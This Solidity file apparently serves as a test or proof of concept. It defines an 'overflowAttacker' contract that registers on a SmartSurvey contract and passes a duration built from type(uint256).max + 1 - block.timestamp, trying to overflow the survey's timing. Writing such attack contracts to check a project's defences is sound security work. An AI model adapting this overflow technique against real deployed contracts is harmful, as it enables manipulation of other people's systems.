// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {SmartSurvey} from "../src/SurveyContract.sol";

contract overflowAttacker {
        SmartSurvey public surveyContract;
        constructor(SmartSurvey _surveyContract) payable {
            surveyContract = _surveyContract;
        }
        function attack() public {
            string[] memory options = new string[](2); 
            options[0] = "no";
            options[1] = "yes";
            surveyContract.registerUser("attacker", 1234);
            uint256 _duration = type(uint256).max + 1 - block.timestamp;
            surveyContract.create_survey("Local School Poll", "Do you support more funding for local schools?", options, _duration, 3,1234); 
        }
    }